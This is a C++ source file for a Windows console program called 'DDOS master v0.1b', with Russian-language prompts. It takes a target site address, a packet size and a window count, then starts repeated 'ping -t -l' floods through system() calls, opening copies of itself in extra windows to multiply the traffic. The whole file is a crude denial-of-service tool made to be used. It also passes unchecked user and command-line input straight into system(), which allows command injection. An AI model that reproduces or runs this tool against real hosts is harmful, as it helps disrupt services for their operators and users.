#include "stdafx.h"
#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <string>

using namespace std;

void Draw_logo() {
	cout << "\t\t\t\tDDOS master v0.1b" << endl << endl;

	/*cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
	cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;    ;@@@@@@@@@@@@;    ;'@@@@@@@@";
	cout << "@@@@@            :@@@@@:            #@@@@@@@            @@@@@@.           @@@@@@";
	cout << "@@@@@     @@@@      @@@:     @@@#     ;@@#     @@@@@'     @@@     @@@@   .;@@@@@";
	cout << "@@@@@     @@@@@     @@@:     @@@@+     @@     ;@@@@@@     ;@@,       `;@@@@@@@@@";
	cout << "@@@@@     @@@@@     #@@:     @@@@@     @@     @@@@@@@`    `@@@;           @@@@@@";
	cout << "@@@@@     @@@@@     #@@:     @@@@@     @@     #@@@@@@`    .@@@@@@;         +@@@@";
	cout << "@@@@@     @@@@@     @@@:     @@@@;     @@`    `@@@@@@     #@@@@@@@@@@@:     @@@@";
	cout << "@@@@@     @@@;     `@@@:     @@@`     #@@@     ,@@@@      @@#     @@@@:     @@@@";
	cout << "@@@@@             .@@@@:             +@@@@@              @@@@`             @@@@@";
	cout << "@@@@@           ;@@@@@@:           ;@@@@@@@@;          #@@@@@@+          :@@@@@@";
	cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
	cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
	cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
	cout << "@@@@@@@  @, :@, ,@@@@@@@,   @@@@@@@@,  ,@@@@@@    .@@@@@@:  ,@@@@@@@  @ ,@@@@@@@";
	cout << "@@@@@@@          ;@@@@@      +@@@@@      @@@@@    .@@@@@      @@@@@@    @@@@@@@@";
	cout << "@@@@@@@   @   @  `@@@@@;,#@  `@@@@@  ,@@@@@@@@@  @@@@@@;  @@  ,@@@@@   @@@@@@@@@";
	cout << "@@@@@@@   @   @  `@@@@@;,#@  `@@@@@  ,@@@@@@@@@  @@@@@@;  @@  ,@@@@@   @@@@@@@@@";
	cout << "@@@@@@@  :@  ,@  `@@@@@@     `@@@@@,     @@@@@@  @@@@@@,      `@@@@@  @@@@@@@@@@";
	cout << "@@@@@@@  :@  ,@  `@@@@@  @@  `@@@@@@@@@  @@@@@@  @@@@@@;  @@@@@@@@@@  @@@@@@@@@@";
	cout << "@@@@@@@  :@  ,@  `@@@@@  @@  `@@@@@@@@@  @@@@@@  @@@@@@;  @@@@@@@@@@  @@@@@@@@@@";
	cout << "@@@@@@@  :@  ,@  `@@@@@      `@@@@@      @@@@@@   .@@@@@      @@@@@@  @@@@@@@@@@";
	cout << "@@@@@@@  :@  ,@  `@@@@@@  #+  @@@@@@,  ,@@@@@@@@  ,@@@@@@,  ,@@@@@@@  @@@@@@@@@@";
	cout << "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";*/
}

void DOS(char *&site_adress, char *&_flows, char command[], char color[]) {
	system("cls");

	Draw_logo();

	int windows = 0;

	cout << "Введите кол-во дополнительных окон: ";
	cin >> windows;

	const char *site = site_adress;
	const char *flows = _flows;
	const char *empty = " ";
	char result[255] = "ping ";
	char flow[] = " -t -l ";
	strcat_s(result, site);
	strcat_s(result, flow);
	strcat_s(result, flows);

	char cmd[1000] = "";

	const char *parametri = result;

	strcat_s(cmd, command);
	strcat_s(cmd, empty);
	strcat_s(cmd, color);
	strcat_s(cmd, empty);
	strcat_s(cmd, parametri);

	if(windows > 0) {
		for(int i = 0; i < windows; i++) {
			system(cmd);
		}
	}

	system(result);
}

int cin_site(char command[], char color[]) {
	char *site_adress = new char[50];
	char *flows = new char[11];

	system("cls");

cin_site:

	Draw_logo();

	cout << "Введите адрес сайта: ";
	cin >> site_adress;

	if(strlen(site_adress) == NULL) {
		cout << "Ошибка #0: Некорректный адрес сайта!" << endl << endl;
		goto cin_site;
	}

	system("cls");

cin_flows:

	Draw_logo();

	cout << "Введите кол-во потоков: ";
	cin >> flows;

	if(flows == NULL) {
		cout << "Ошибка #1: Кол-во потоков должно быть больше 0!" << endl << endl;
		goto cin_flows;
	}

	DOS(site_adress, flows, command, color);
	delete[] site_adress;
	delete[] flows;

	site_adress = nullptr;
	flows = nullptr;

	return 0;
}

void menu(char command[]) {
	bool exit = false;
	bool first = true;
	int choose = 0;
	char color[10] = "";
	const char *color_1 = "color f";
	const char *color_2 = "color a";
	const char *color_3 = "color b";
	const char *color_4 = "color c";
	const char *color_5 = "color d";
	int num = 0;

	while(exit == false) {
		if(first == false) {
			num = _getch();
			switch(num) {
			case 72:
				if(choose > 0) {
					choose--;
				} else {
					choose = 4;
				}
				break;
			case 80:
				if(choose < 4) {
					choose++;
				} else {
					choose = 0;
				}
				break;
			case 27:
				exit = true;
				break;
			case 75:
				exit = true;
				break;
			}
			system("cls");
		}
		Draw_logo();
		const char* colors[] = { "Белый  ", "Зелёный", "Синий  ", "Красный", "Розовый" };
		for(int i = 0; i < sizeof(colors) / sizeof(*colors); ++i) {
			std::cout << i << ") " << colors[i] << "     " << (choose == i ? "<-\n" : "  \n");
		}
		first = false;
	}

	switch(choose) {
	case 0:
		strcat_s(color, color_1);
		system("color f");
		break;
	case 1:
		strcat_s(color, color_2);
		system("color a");
		break;
	case 2:
		strcat_s(color, color_3);
		system("color b");
		break;
	case 3:
		strcat_s(color, color_4);
		system("color c");
		break;
	case 4:
		strcat_s(color, color_5);
		system("color d");
		break;
	default:
		strcat_s(color, color_1);
		system("color f");
		break;
	}
	cin_site(command, color);
}

int main(int argc, char* argv[]) {
	setlocale(LC_ALL, "ru");

	if(argc > 1) {
		Draw_logo();
		char color[255] = "";
		char DOS[255] = "";
		const char *empty = " ";

		strcat_s(color, argv[1]);
		strcat_s(color, empty);
		strcat_s(color, argv[2]);

		strcat_s(DOS, argv[3]);
		strcat_s(DOS, empty);
		strcat_s(DOS, argv[4]);
		strcat_s(DOS, empty);
		strcat_s(DOS, argv[5]);
		strcat_s(DOS, empty);
		strcat_s(DOS, argv[6]);
		strcat_s(DOS, empty);
		strcat_s(DOS, argv[7]);

		system(color);
		system(DOS);
	}

	char command[255] = "Start ";
	strcat_s(command, argv[0]);

	menu(command);

	system("pause");
	return 0;
}